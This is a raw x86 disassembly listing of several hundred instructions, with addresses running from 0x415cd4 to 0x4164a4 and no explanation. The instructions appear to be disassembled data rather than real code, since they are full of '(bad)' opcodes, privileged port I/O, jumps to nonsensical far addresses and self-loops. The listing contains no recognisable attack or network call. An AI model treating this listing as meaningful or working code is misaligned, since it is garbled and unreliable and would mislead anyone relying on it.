  415cd4:	cmp    ebp,DWORD PTR [ebx-0x3fd93926]
  415cda:	in     al,0x42
  415cdc:	sbb    BYTE PTR ds:0xf9d58c0f,dl
  415ce2:	jmp    0x8c717549
  415ce7:	push   eax
  415ce8:	inc    edx
  415ce9:	push   edx
  415cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cec:	data16 jmp 0x415c9d
  415cef:	les    edi,FWORD PTR [esi]
  415cf1:	shr    DWORD PTR [ebx+0x60a15380],cl
  415cf7:	test   BYTE PTR [esi+0xa],0xa8
  415cfb:	repz mov WORD PTR [ecx-0x359481f0],gs
  415d02:	lods   eax,DWORD PTR ds:[esi]
  415d03:	jne    0x415d84
  415d05:	xor    edx,DWORD PTR [esi-0x1b07f252]
  415d0b:	int    0x71
  415d0d:	inc    ecx
  415d0e:	fdiv   DWORD PTR [ecx+ebp*4-0x41]
  415d12:	dec    edi
  415d13:	lods   al,BYTE PTR ds:[esi]
  415d14:	mov    esp,DWORD PTR [ebp+0x8fe589b]
  415d1a:	and    BYTE PTR [ebx-0x2be2721c],ah
  415d20:	xor    eax,0xa65f24bf
  415d25:	(bad)  
  415d26:	inc    ecx
  415d27:	out    dx,al
  415d28:	add    eax,0x534ed168
  415d2d:	in     al,dx
  415d2e:	in     al,dx
  415d2f:	sub    bh,BYTE PTR [edx]
  415d31:	mov    bh,0x64
  415d33:	cmp    al,0xde
  415d35:	rcl    bl,0xfb
  415d38:	shr    DWORD PTR [esi-0x3a],cl
  415d3b:	push   edi
  415d3c:	jg     0x415d05
  415d3e:	ins    BYTE PTR es:[edi],dx
  415d3f:	enter  0xc6d5,0x5f
  415d43:	fisttp WORD PTR [edi+ebp*1]
  415d46:	push   es
  415d47:	in     al,dx
  415d48:	jle    0x415da4
  415d4a:	lock pop esi
  415d4c:	test   al,0x89
  415d4e:	out    dx,al
  415d4f:	into   
  415d50:	add    BYTE PTR ds:0x18f5a326,cl
  415d56:	mov    cl,0x77
  415d58:	mul    BYTE PTR [eax+0x26]
  415d5b:	pop    edx
  415d5c:	int    0x9
  415d5e:	and    edi,DWORD PTR [ebx]
  415d60:	aad    0xaf
  415d62:	fwait
  415d63:	gs xchg edi,eax
  415d65:	div    DWORD PTR [eax+ebx*8+0x28]
  415d69:	dec    ebp
  415d6a:	gs push 0xffffff8d
  415d6d:	stos   BYTE PTR es:[edi],al
  415d6e:	stc    
  415d6f:	xchg   ecx,eax
  415d70:	push   ecx
  415d71:	pop    ebp
  415d72:	imul   edi,DWORD PTR [edi+0x7eaf3c1e],0xa91d6a6b
  415d7c:	jns    0x415d1a
  415d7e:	mov    ebx,0x3de5885c
  415d83:	and    ebx,DWORD PTR [ebx]
  415d85:	cdq    
  415d86:	add    eax,0xf37bb69d
  415d8b:	fcomp  DWORD PTR [ebx+0x64606b75]
  415d91:	mov    bh,0x37
  415d93:	das    
  415d94:	rcr    BYTE PTR [eax-0x28dda4be],1
  415d9a:	xlat   BYTE PTR ds:[ebx]
  415d9b:	fwait
  415d9c:	mov    ecx,0x22a860c5
  415da1:	inc    ebx
  415da2:	sub    dl,bl
  415da4:	lods   al,BYTE PTR ds:[esi]
  415da5:	in     eax,0xdb
  415da7:	pusha  
  415da8:	lahf   
  415da9:	pushf  
  415daa:	jae    0x415da4
  415dac:	mov    bh,0x6d
  415dae:	and    al,0x83
  415db0:	sub    eax,0x50b6c0ef
  415db5:	fldenv [ebp+edi*2-0x31]
  415db9:	xchg   BYTE PTR ds:0x38cbb887,bl
  415dbf:	adc    DWORD PTR [edi-0x7d011fbe],ecx
  415dc5:	lea    ecx,[ecx]
  415dc7:	repnz mov edi,0xac42e72f
  415dcd:	mov    DWORD PTR [ebp-0x2c7249ab],edi
  415dd3:	or     edi,DWORD PTR [eax+ecx*8]
  415dd6:	je     0x415e4b
  415dd8:	lods   eax,DWORD PTR ds:[esi]
  415dd9:	mov    ah,0x8b
  415ddb:	pop    ss
  415ddc:	mov    dh,0x6e
  415dde:	mov    ebp,0x2b802232
  415de3:	xor    DWORD PTR [eax-0x21],ecx
  415de6:	les    eax,FWORD PTR [ebx+0x61cbd512]
  415dec:	mov    ds:0x4a05c444,eax
  415df1:	cli    
  415df2:	mov    eax,0x952c1e18
  415df7:	ror    DWORD PTR [ebp+0x61],0xe8
  415dfb:	push   ss
  415dfc:	pop    eax
  415dfd:	xor    bl,BYTE PTR [edi]
  415dff:	rcr    BYTE PTR [esi+0x62],0x77
  415e03:	sub    al,0x99
  415e05:	fcom   st(7)
  415e07:	push   ebx
  415e08:	inc    DWORD PTR [esi-0x513de436]
  415e0e:	sub    DWORD PTR [edi],esi
  415e10:	ror    DWORD PTR [ecx],cl
  415e12:	pop    esi
  415e13:	jg     0x415dcc
  415e15:	inc    ebp
  415e16:	mov    ds:0x50c8c03f,al
  415e1b:	cld    
  415e1c:	xchg   ebx,eax
  415e1d:	or     dh,cl
  415e1f:	push   DWORD PTR [ebx]
  415e21:	adc    bh,BYTE PTR [edi+0x25]
  415e24:	out    dx,eax
  415e25:	xor    al,0xa4
  415e27:	or     eax,0x8ab9efce
  415e2c:	test   al,0x3c
  415e2e:	dec    eax
  415e2f:	mov    WORD PTR [esi+edx*4],es
  415e32:	xchg   DWORD PTR [edx],esp
  415e34:	fs mov bh,0x5b
  415e37:	dec    esp
  415e38:	push   ss
  415e39:	(bad)  
  415e3a:	retf   
  415e3b:	(bad)  
  415e3c:	and    al,0xdd
  415e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e3f:	mov    ch,0xae
  415e41:	call   0x563f:0x32395a2b
  415e48:	stc    
  415e49:	mov    BYTE PTR [ebp+0x75],bh
  415e4c:	test   al,0xdb
  415e4e:	or     bl,dl
  415e50:	adc    BYTE PTR [ebp-0x2b968dc5],dl
  415e56:	cwde   
  415e57:	mov    al,ds:0xb548ce35
  415e5c:	int3   
  415e5d:	cmp    dh,BYTE PTR [esi-0x1199957d]
  415e63:	push   ss
  415e64:	push   edx
  415e65:	pop    ss
  415e66:	mov    bh,0x6c
  415e68:	ss inc ecx
  415e6a:	xchg   ecx,eax
  415e6b:	cmp    al,0x1b
  415e6d:	mov    edi,DWORD PTR [ebp-0x5d6035f2]
  415e73:	jmp    0x45f84945
  415e78:	xchg   edi,eax
  415e79:	daa    
  415e7a:	es xchg edi,eax
  415e7c:	push   ebx
  415e7d:	clc    
  415e7e:	cwde   
  415e7f:	inc    ebp
  415e80:	stc    
  415e81:	push   cs
  415e82:	into   
  415e83:	lock iret 
  415e85:	imul   edx,DWORD PTR [esi],0x55abcaa7
  415e8b:	add    al,0x8
  415e8d:	sar    BYTE PTR [ebx],1
  415e8f:	loope  0x415ea7
  415e91:	cmp    esi,DWORD PTR [ebx-0x12]
  415e94:	(bad)  
  415e95:	mov    eax,0x554333ee
  415e9a:	push   ecx
  415e9b:	cmp    BYTE PTR ds:0xd2994f84,cl
  415ea1:	push   es
  415ea2:	cmc    
  415ea3:	push   ecx
  415ea4:	call   0xf7dc:0x2acbdc0d
  415eab:	jne    0x415e93
  415ead:	mov    edx,0xf646612f
  415eb2:	stc    
  415eb3:	add    ebp,DWORD PTR [ebp+0x29b3bbf]
  415eb9:	pop    ebx
  415eba:	out    dx,al
  415ebb:	jmp    0x80ca:0x402c1dc4
  415ec2:	xchg   DWORD PTR [ecx],ebp
  415ec4:	mov    bh,0x8f
  415ec6:	imul   BYTE PTR [ecx+edi*2+0x1a056ba1]
  415ecd:	daa    
  415ece:	or     DWORD PTR [ebx+esi*2+0x1834421c],esi
  415ed5:	jle    0x415f4b
  415ed7:	mov    bl,0x47
  415ed9:	sbb    BYTE PTR [edx],ch
  415edb:	ss fwait
  415edd:	adc    cl,BYTE PTR [edx+0x32]
  415ee0:	xchg   edi,eax
  415ee1:	sti    
  415ee2:	pop    ss
  415ee3:	scas   eax,DWORD PTR es:[edi]
  415ee4:	sbb    dh,BYTE PTR [eax+0x5d7d98fd]
  415eea:	in     al,dx
  415eeb:	xor    dl,BYTE PTR [ecx+0x6fa2f6f8]
  415ef1:	and    eax,0x1b35f273
  415ef6:	pop    esi
  415ef7:	xor    al,BYTE PTR [eax-0x4c3b45da]
  415efd:	push   esi
  415efe:	shl    edx,1
  415f00:	outs   dx,BYTE PTR ds:[esi]
  415f01:	jle    0x415e9c
  415f03:	leave  
  415f04:	inc    esp
  415f05:	pop    es
  415f06:	in     al,0xd0
  415f08:	jge    0x415edb
  415f0a:	sbb    al,0x7d
  415f0c:	add    al,0x9b
  415f0e:	mov    ecx,0x63a43da7
  415f13:	fild   DWORD PTR [ebx+0x3f]
  415f16:	cwde   
  415f17:	retf   0xb845
  415f1a:	repz pop es
  415f1c:	pop    ecx
  415f1d:	mov    WORD PTR [ebx],fs
  415f1f:	mov    ch,0x4f
  415f21:	sub    eax,0x4d3097ab
  415f26:	push   0x540e0674
  415f2b:	add    eax,0xfe2638e1
  415f30:	dec    BYTE PTR [ebx]
  415f32:	in     al,0x31
  415f34:	scas   eax,DWORD PTR es:[edi]
  415f35:	outs   dx,DWORD PTR ds:[esi]
  415f36:	shr    BYTE PTR [eax+0x29],1
  415f39:	fstp   TBYTE PTR [edx]
  415f3b:	or     al,0xde
  415f3d:	inc    eax
  415f3e:	mov    bh,0xb2
  415f40:	loop   0x415eea
  415f42:	xor    al,0x1c
  415f44:	mov    ds:0x4baa5dc1,eax
  415f49:	repz and eax,ebp
  415f4c:	pcmpgtd mm1,QWORD PTR [ecx+0x3f8a4368]
  415f53:	cli    
  415f54:	sahf   
  415f55:	inc    edx
  415f56:	adc    al,0x4f
  415f58:	imul   si,ax,0x2ea3
  415f5d:	inc    esp
  415f5e:	test   eax,0xa10de40a
  415f63:	jne    0x415fa2
  415f65:	jl     0x415f1e
  415f67:	enter  0x7f38,0xde
  415f6b:	inc    ecx
  415f6c:	xchg   edx,eax
  415f6d:	shl    BYTE PTR [edx],cl
  415f6f:	into   
  415f70:	arpl   WORD PTR [edx-0x20e3c388],sp
  415f76:	push   cs
  415f77:	sar    DWORD PTR [eiz*4-0x6168d9c1],1
  415f7e:	dec    ebx
  415f7f:	enter  0x9566,0xe3
  415f83:	es push ecx
  415f85:	xlat   BYTE PTR ds:[ebx]
  415f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f87:	out    0xa5,eax
  415f89:	fiadd  WORD PTR [esi-0x3316d721]
  415f8f:	hlt    
  415f90:	or     al,0xba
  415f92:	jmp    0x415f92
  415f94:	daa    
  415f95:	icebp  
  415f96:	aas    
  415f97:	lods   eax,DWORD PTR ds:[esi]
  415f98:	scas   al,BYTE PTR es:[edi]
  415f99:	mov    edx,0x18e8a953
  415f9e:	lock dec edx
  415fa0:	sbb    BYTE PTR [edx-0x10],bl
  415fa3:	call   0x4f2d:0x12c381a5
  415faa:	daa    
  415fab:	push   ebp
  415fac:	or     BYTE PTR [edi],ch
  415fae:	and    al,0x9f
  415fb0:	icebp  
  415fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fb2:	jle    0x415ff7
  415fb4:	in     eax,dx
  415fb5:	in     al,dx
  415fb6:	ins    BYTE PTR es:[edi],dx
  415fb7:	adc    DWORD PTR [edi+0x62],esi
  415fba:	outs   dx,BYTE PTR ds:[esi]
  415fbb:	xor    al,0xb6
  415fbd:	inc    edi
  415fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fbf:	dec    esp
  415fc0:	ror    BYTE PTR [ebx+0x32aa67ee],cl
  415fc6:	popf   
  415fc7:	repz dec ebx
  415fc9:	push   ecx
  415fca:	arpl   bp,dx
  415fcc:	push   ebx
  415fcd:	jns    0x415f84
  415fcf:	pusha  
  415fd0:	jp     0x415f57
  415fd2:	int3   
  415fd3:	das    
  415fd4:	push   cs
  415fd5:	xchg   edi,eax
  415fd6:	inc    eax
  415fd7:	or     bh,BYTE PTR [esi-0x48]
  415fda:	inc    ebp
  415fdb:	es int 0x6a
  415fde:	clc    
  415fdf:	bound  edi,QWORD PTR [eax]
  415fe1:	jmp    0x2a2a:0xd0b4af52
  415fe8:	or     al,al
  415fea:	push   es
  415feb:	cwde   
  415fec:	ss daa 
  415fee:	aam    0xbd
  415ff0:	pop    edx
  415ff1:	jp     0x415ff1
  415ff3:	pop    esp
  415ff4:	pusha  
  415ff5:	dec    ebx
  415ff6:	mov    al,0xd9
  415ff8:	add    ebp,DWORD PTR [ecx-0x5d232a8a]
  415ffe:	sti    
  415fff:	pop    ss
  416000:	out    0xb4,al
  416002:	ins    DWORD PTR es:[edi],dx
  416003:	mov    ds:0xeb201f8e,al
  416008:	pop    esp
  416009:	mov    esp,0x102b195f
  41600e:	(bad)  
  41600f:	nop
  416010:	mov    ds:0x9ee52636,eax
  416015:	lock mov es,WORD PTR [edx]
  416018:	adc    bl,BYTE PTR [edi]
  41601a:	adc    al,0x71
  41601c:	stos   DWORD PTR es:[edi],eax
  41601d:	pop    es
  41601e:	mov    WORD PTR ds:0x25705816,cs
  416024:	mov    dh,0x85
  416026:	idiv   DWORD PTR [ecx-0x5d4d3ccb]
  41602c:	jmp    0x416007
  41602e:	push   edi
  41602f:	jle    0x416029
  416031:	ficomp WORD PTR [esi*1+0x7b635e89]
  416038:	in     al,dx
  416039:	pop    eax
  41603a:	fdivr  QWORD PTR [esi-0x4d]
  41603d:	and    bl,BYTE PTR [ebx]
  41603f:	xchg   BYTE PTR [edi-0x2279e303],ah
  416045:	pop    ecx
  416046:	sti    
  416047:	nop
  416048:	sub    bh,bh
  41604a:	dec    ebp
  41604b:	push   ebp
  41604c:	sti    
  41604d:	out    0x44,eax
  41604f:	mov    WORD PTR [eax+0x5a8d0cba],?
  416055:	rcl    ebx,1
  416057:	gs mov esp,0xfafa693
  41605d:	dec    ebx
  41605e:	popf   
  41605f:	sbb    esp,DWORD PTR [edx+esi*8+0x658e7af0]
  416066:	std    
  416067:	or     DWORD PTR [edi+0x1c],ebp
  41606a:	push   ecx
  41606b:	clc    
  41606c:	push   cs
  41606d:	jl     0x415ff7
  41606f:	jg     0x41601f
  416071:	mov    ebx,0xb538b945
  416076:	stos   BYTE PTR es:[edi],al
  416077:	inc    esp
  416078:	das    
  416079:	or     eax,0xb1b59f4
  41607e:	fnstcw WORD PTR gs:[esi+0x61]
  416082:	or     DWORD PTR [ebx],esp
  416084:	xor    DWORD PTR [ebp-0x4beeeb1e],esi
  41608a:	ret    
  41608b:	mov    bh,0x6d
  41608d:	fdiv   QWORD PTR [ecx]
  41608f:	sbb    al,0x2a
  416091:	sub    bh,BYTE PTR [ebp+0x7e]
  416094:	les    edi,FWORD PTR [eax-0x5e313606]
  41609a:	or     BYTE PTR [edi+0x3b],al
  41609d:	in     eax,0x3b
  41609f:	sahf   
  4160a0:	cmc    
  4160a1:	inc    edx
  4160a2:	fcom   QWORD PTR [edx+0x18]
  4160a5:	and    eax,0xe46659b5
  4160aa:	call   0x6e86246
  4160af:	add    eax,0x1d0a1407
  4160b4:	dec    ebx
  4160b5:	push   cs
  4160b6:	idiv   DWORD PTR [ebx+0x19]
  4160b9:	pop    edi
  4160ba:	out    dx,eax
  4160bb:	xor    esp,DWORD PTR [esi]
  4160bd:	or     bh,BYTE PTR [esi]
  4160bf:	mov    ch,0xac
  4160c1:	sahf   
  4160c2:	xor    DWORD PTR [ebx],edx
  4160c4:	push   edx
  4160c5:	imul   edi,DWORD PTR [edx-0x6e809cae],0x4b10ad59
  4160cf:	dec    ebx
  4160d0:	fidivr WORD PTR [esi-0x61]
  4160d3:	xchg   ebx,eax
  4160d4:	push   esi
  4160d5:	mov    fs,esp
  4160d7:	xchg   esi,eax
  4160d8:	mov    edi,0x1874c30e
  4160dd:	in     eax,dx
  4160de:	xchg   DWORD PTR [ebp-0x72],esi
  4160e1:	bound  esi,QWORD PTR [ecx+ebx*8+0x95728f3]
  4160e8:	in     al,dx
  4160e9:	out    dx,al
  4160ea:	out    0xd0,al
  4160ec:	sub    eax,edi
  4160ee:	push   0xffffff90
  4160f0:	jne    0x41610f
  4160f2:	pusha  
  4160f3:	pop    ecx
  4160f4:	leave  
  4160f5:	inc    ebx
  4160f6:	mov    ss,WORD PTR [edx-0x40ab955f]
  4160fc:	lds    edx,FWORD PTR [esi]
  4160fe:	xchg   esi,eax
  4160ff:	inc    ebp
  416100:	cmp    eax,0x9deb4b9d
  416105:	adc    al,0xd8
  416107:	cmp    bh,BYTE PTR [ebx+0x1d]
  41610a:	daa    
  41610b:	mov    ch,0x6f
  41610d:	das    
  41610e:	or     al,0x93
  416110:	push   edi
  416111:	outs   dx,DWORD PTR ds:[esi]
  416112:	test   al,0x8a
  416114:	jecxz  0x416153
  416116:	push   0xffffff9f
  416118:	or     BYTE PTR [eax],dl
  41611a:	pop    edi
  41611b:	mov    ds:0x7fad6876,al
  416120:	mov    dh,0xac
  416122:	cld    
  416123:	js     0x416110
  416125:	pop    ds
  416126:	cdq    
  416127:	cmp    eax,0x44293dfc
  41612c:	pop    esp
  41612d:	sbb    al,0x2
  41612f:	pushf  
  416130:	xor    edi,esi
  416132:	not    DWORD PTR [edi+0xa]
  416135:	int3   
  416136:	addr16 retf 0xc17d
  41613a:	mov    eax,ds:0x9d231f86
  41613f:	cmp    eax,0xb22d464
  416144:	cld    
  416145:	sahf   
  416146:	sub    edx,DWORD PTR [esi*4+0x2558eecf]
  41614d:	push   ebp
  41614e:	mov    DWORD PTR [esi+0x32a2a24e],ebp
  416154:	cs int3 
  416156:	add    eax,0x952b91ea
  41615b:	pop    es
  41615c:	icebp  
  41615d:	xchg   edx,eax
  41615e:	iret   
  41615f:	and    esi,DWORD PTR [edx-0x63865884]
  416165:	jno    0x41613a
  416167:	sub    DWORD PTR [eax+ecx*2],edi
  41616a:	data16 aam 0x49
  41616d:	dec    ebx
  41616e:	pop    ds
  41616f:	jecxz  0x4160f3
  416171:	cmp    al,0x3a
  416173:	les    ebp,FWORD PTR [ecx+0x5]
  416176:	fadd   DWORD PTR [eax]
  416178:	jmp    0x2494:0xab32ad3e
  41617f:	int    0x30
  416181:	ret    0x6088
  416184:	loop   0x416129
  416186:	arpl   WORD PTR [edx-0x50bb8c3e],si
  41618c:	enter  0x3903,0x21
  416190:	jnp    0x4161f3
  416192:	xchg   DWORD PTR [ebx],ebx
  416194:	pop    edx
  416195:	test   BYTE PTR [edx],bh
  416197:	push   ss
  416198:	inc    ebx
  416199:	or     eax,0xdf6438b4
  41619e:	pop    ebp
  41619f:	in     eax,dx
  4161a0:	cmp    ebx,DWORD PTR [ebx-0x449df6ce]
  4161a6:	loopne 0x4161c9
  4161a8:	push   edx
  4161a9:	add    ah,BYTE PTR [edi-0x54]
  4161ac:	cmc    
  4161ad:	jmp    0x4161fc
  4161af:	cmp    BYTE PTR [edx],0xa5
  4161b2:	ret    
  4161b3:	xchg   DWORD PTR [esi+0x67d9807f],ebx
  4161b9:	sbb    esp,DWORD PTR [ebp+0x4347f975]
  4161bf:	jbe    0x4161d5
  4161c1:	je     0x416167
  4161c3:	ja     0x41618c
  4161c5:	or     DWORD PTR [ecx-0x56130d22],eax
  4161cb:	push   0xf92bce34
  4161d0:	add    bp,WORD PTR [ebp-0x61]
  4161d4:	or     DWORD PTR [eax],esp
  4161d6:	outs   dx,DWORD PTR ds:[esi]
  4161d7:	out    dx,eax
  4161d8:	cmp    bh,BYTE PTR [ebp+eax*2-0x50]
  4161dc:	dec    esp
  4161dd:	cli    
  4161de:	xchg   cx,ax
  4161e0:	fwait
  4161e1:	das    
  4161e2:	push   esp
  4161e3:	xchg   esp,eax
  4161e4:	cli    
  4161e5:	pop    ebx
  4161e6:	inc    ebp
  4161e7:	mov    eax,ds:0x41130f51
  4161ec:	cwde   
  4161ed:	push   ebp
  4161ee:	fisttp WORD PTR [ebx+ebp*8-0xcec4feb]
  4161f5:	pop    esi
  4161f6:	or     BYTE PTR [ebx],ch
  4161f8:	aam    0xff
  4161fa:	fmul   QWORD PTR [esi+0x13eb35e3]
  416200:	mov    ebp,0xa5f0449f
  416205:	dec    edx
  416206:	dec    ecx
  416207:	(bad)
  41620b:	ror    ebp,0xc6
  41620e:	std    
  41620f:	lods   al,BYTE PTR ds:[esi]
  416210:	ficom  DWORD PTR [edx]
  416212:	lods   al,BYTE PTR ds:[esi]
  416213:	and    al,0xb1
  416215:	mov    esp,0xbb5ab5c
  41621a:	aaa    
  41621b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621c:	cmp    al,0xa5
  41621e:	jnp    0x4161d8
  416220:	jmp    0x87e59db
  416225:	inc    esp
  416226:	or     BYTE PTR [edi+0xe7d09a0],0x5e
  41622d:	and    bh,BYTE PTR [esi+esi*2-0x3c]
  416231:	pusha  
  416232:	clc    
  416233:	and    al,bh
  416235:	sbb    al,0xa3
  416237:	bnd jne 0x416230
  41623a:	push   esp
  41623b:	mov    ebp,0xa71463f1
  416240:	fist   WORD PTR [ecx]
  416242:	jnp    0x416204
  416244:	ds jg  0x416248
  416247:	(bad)  
  416248:	(bad)  
  416249:	jnp    0x4161de
  41624b:	pop    ebp
  41624c:	inc    eax
  41624d:	jbe    0x41625c
  41624f:	cmc    
  416250:	sub    cl,BYTE PTR [ebp-0x6450ae97]
  416256:	xlat   BYTE PTR ds:[ebx]
  416257:	mov    eax,ds:0x7165af0e
  41625c:	xchg   esi,eax
  41625d:	inc    eax
  41625e:	and    BYTE PTR [esp+edx*1],al
  416261:	pushw  0x32
  416264:	leave  
  416265:	pop    ebx
  416266:	in     al,0x38
  416268:	je     0x4161eb
  41626a:	dec    ecx
  41626b:	retf   0xa2ec
  41626e:	push   esi
  41626f:	jp     0x416286
  416271:	lds    ebp,FWORD PTR [edi-0x60]
  416274:	(bad)  
  416275:	fisttp DWORD PTR [eax+0x1de3b882]
  41627b:	adc    eax,0xe439ad5
  416280:	fwait
  416281:	aam    0x47
  416283:	rcl    BYTE PTR [ecx],cl
  416285:	jecxz  0x4162cf
  416287:	jecxz  0x416251
  416289:	loopne 0x416259
  41628b:	xor    eax,DWORD PTR [eax+0x6f]
  41628e:	clc    
  41628f:	push   esp
  416290:	in     eax,dx
  416291:	call   0x8918:0x849e05d1
  416298:	jmp    0x142216b5
  41629d:	adc    edi,edx
  41629f:	repnz add DWORD PTR [edx-0x10ca8717],edx
  4162a6:	cmp    dx,bx
  4162a9:	outs   dx,DWORD PTR ds:[esi]
  4162aa:	sar    BYTE PTR [ebp+0x77],0x62
  4162ae:	bound  esp,QWORD PTR [eax-0x41]
  4162b1:	ja     0x416260
  4162b3:	xchg   DWORD PTR [edx],esi
  4162b5:	test   al,0x28
  4162b7:	int3   
  4162b8:	dec    edi
  4162b9:	cmp    eax,0xfb56e59e
  4162be:	cwde   
  4162bf:	les    ecx,FWORD PTR [edx-0x4b]
  4162c2:	sbb    al,0x1d
  4162c4:	fcomp  DWORD PTR [ebx]
  4162c6:	xor    BYTE PTR [eax+0x14c1a49b],bl
  4162cc:	lods   al,BYTE PTR ds:[esi]
  4162cd:	cmp    bh,bh
  4162cf:	adc    al,0xc3
  4162d1:	shl    DWORD PTR [ebx+0x4443a074],cl
  4162d7:	loopne 0x41625e
  4162d9:	mov    esp,0xd1d826e2
  4162de:	loop   0x41628c
  4162e0:	add    dl,BYTE PTR [esi]
  4162e2:	ss mov ecx,0xcd3850c0
  4162e8:	add    DWORD PTR [eax],eax
  4162ea:	sub    BYTE PTR [esi],0x86
  4162ed:	(bad)  
  4162ee:	in     al,dx
  4162ef:	cmp    al,bl
  4162f1:	mov    dh,0x89
  4162f3:	in     eax,dx
  4162f4:	hlt    
  4162f5:	and    al,0xe6
  4162f7:	add    al,0xac
  4162f9:	jle    0x416322
  4162fb:	push   ebx
  4162fc:	daa    
  4162fd:	clc    
  4162fe:	push   cs
  4162ff:	fdivrp st(1),st
  416301:	jae    0x416349
  416303:	test   al,0x38
  416305:	sti    
  416306:	bound  esp,QWORD PTR [esi]
  416308:	xor    DWORD PTR [esi],eax
  41630a:	scas   eax,DWORD PTR es:[edi]
  41630b:	lea    edx,ds:0x6e496846
  416311:	jbe    0x4162c3
  416313:	js     0x4162ec
  416315:	and    eax,0x87176df9
  41631a:	in     al,dx
  41631b:	push   es
  41631c:	dec    esp
  41631d:	mov    eax,0x1e81136b
  416322:	mov    edi,0x4b4c67ff
  416327:	inc    esi
  416328:	dec    eax
  416329:	in     al,0xcc
  41632b:	out    dx,eax
  41632c:	jecxz  0x41636f
  41632e:	jecxz  0x41633b
  416330:	pop    edx
  416331:	stos   DWORD PTR es:[edi],eax
  416332:	inc    eax
  416333:	je     0x4163a9
  416335:	mov    bh,0xae
  416337:	mov    al,0xaf
  416339:	ins    BYTE PTR es:[edi],dx
  41633a:	pop    ebx
  41633b:	rol    DWORD PTR [eax-0x686f68bf],1
  416341:	pop    ebp
  416342:	add    al,0x48
  416344:	sub    DWORD PTR ds:0x59441dc5,edx
  41634a:	ret    0x21bc
  41634d:	mov    al,0xe7
  41634f:	mov    dl,0x8a
  416351:	sub    ch,BYTE PTR [edx+0x43]
  416354:	dec    esp
  416355:	mov    ebp,0x89922caf
  41635a:	mov    al,ds:0xdf902a68
  41635f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416360:	(bad)  
  416361:	xchg   edi,eax
  416362:	ret    
  416363:	push   ebx
  416364:	xchg   edx,eax
  416365:	lods   al,BYTE PTR ds:[esi]
  416366:	mov    al,ds:0x38010065
  41636b:	fs daa 
  41636d:	cmp    eax,0x40eb0d31
  416372:	pop    ss
  416373:	push   eax
  416374:	fild   WORD PTR [eax]
  416376:	pop    ecx
  416377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416378:	xor    eax,0xbcfe65d8
  41637d:	mov    eax,0xded94ec0
  416382:	enter  0x8cd5,0x70
  416386:	xor    al,0xea
  416388:	mov    ch,0xce
  41638a:	fwait
  41638b:	aas    
  41638c:	dec    edx
  41638d:	fld    QWORD PTR [ecx]
  41638f:	mov    cl,0x70
  416391:	std    
  416392:	in     eax,dx
  416393:	call   0x6509:0xb80fd3a9
  41639a:	ret    0xcfd1
  41639d:	and    ecx,DWORD PTR [ecx-0x33b5f365]
  4163a3:	cmp    ecx,DWORD PTR [esi-0x32ec45bf]
  4163a9:	aad    0xd5
  4163ab:	fucomip st,st(2)
  4163ad:	pushf  
  4163ae:	aaa    
  4163af:	hlt    
  4163b0:	jns    0x416378
  4163b2:	adc    eax,0xb9670adb
  4163b7:	xchg   esi,eax
  4163b8:	ret    
  4163b9:	mov    edx,0x1063d442
  4163be:	inc    eax
  4163bf:	mov    DWORD PTR [ebp-0x197f43ba],0x5c9df9b
  4163c9:	mov    BYTE PTR [edx+0x2d],bl
  4163cc:	xor    ebp,DWORD PTR [esp+esi*2]
  4163cf:	(bad)  
  4163d0:	and    BYTE PTR [edi+ecx*8],bh
  4163d3:	std    
  4163d4:	loop   0x41643f
  4163d6:	push   ebp
  4163d7:	fs or  al,0x0
  4163da:	xchg   esp,eax
  4163db:	mov    ch,0xa0
  4163dd:	mov    ebp,0xf72bbc26
  4163e2:	and    eax,0xcdc0b32b
  4163e7:	pop    edi
  4163e8:	popf   
  4163e9:	or     ebp,DWORD PTR [edi-0x75]
  4163ec:	(bad)  
  4163ee:	out    0x7f,al
  4163f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163f1:	jae    0x4163c9
  4163f3:	sbb    BYTE PTR [esi+0x7c],al
  4163f6:	sub    eax,0xd91c3d70
  4163fb:	xor    eax,0x5d7bc2c0
  416400:	sub    BYTE PTR [esi],cl
  416402:	shl    edx,0x7e
  416405:	cs cld 
  416407:	and    esi,ebx
  416409:	div    BYTE PTR [ecx+0x4e6f24cc]
  41640f:	test   eax,0xf73f50e7
  416414:	ins    BYTE PTR es:[edi],dx
  416415:	cmp    eax,0x7986f36b
  41641a:	mov    ds:0x27662161,al
  41641f:	xchg   ebp,eax
  416420:	mov    BYTE PTR [eax],al
  416422:	mov    bh,0xb3
  416424:	xor    eax,0xf22c6e95
  416429:	add    BYTE PTR [edi],cl
  41642b:	lods   eax,DWORD PTR ds:[esi]
  41642c:	xor    BYTE PTR ds:0xa1916bdd,bh
  416432:	cdq    
  416433:	in     al,0xa3
  416435:	pop    ds
  416436:	sbb    DWORD PTR [ebx*4+0x5d771ff1],esi
  41643d:	imul   ecx,DWORD PTR ss:[ebx+ecx*1+0x21],0xffffffce
  416443:	mov    ds:0xcef5407,al
  416448:	mov    dl,BYTE PTR [esi]
  41644a:	adc    eax,0x16dcbb4c
  41644f:	int    0x6
  416451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416452:	xchg   ecx,eax
  416453:	mov    ds:0x408d37cb,eax
  416458:	mov    DWORD PTR [ecx],eax
  41645a:	dec    ebx
  41645b:	and    al,0x4b
  41645d:	add    BYTE PTR [ebx+0x73069842],al
  416463:	mov    ch,0x7f
  416465:	jbe    0x41645b
  416467:	loope  0x41646e
  416469:	adc    ch,BYTE PTR cs:[edi-0x6c]
  41646d:	mov    ch,0x2c
  41646f:	xchg   BYTE PTR [edi+0x2e0b3739],al
  416475:	and    BYTE PTR [edx-0x19de7d00],ah
  41647b:	push   edx
  41647c:	jb     0x416414
  41647e:	repnz mov ch,0xfd
  416481:	mov    DWORD PTR [eax-0xdf29faa],ebp
  416487:	icebp  
  416488:	jno    0x416418
  41648a:	data16 and ah,BYTE PTR [edx-0x9]
  41648e:	xchg   BYTE PTR [ecx-0x357585ae],ah
  416494:	add    ah,ah
  416496:	pop    ds
  416497:	dec    ecx
  416498:	cmp    esp,DWORD PTR [eax-0x3166a216]
  41649e:	enter  0x732a,0x26
  4164a2:	mov    ch,0xc1
  4164a4:	sub    al,0x7d
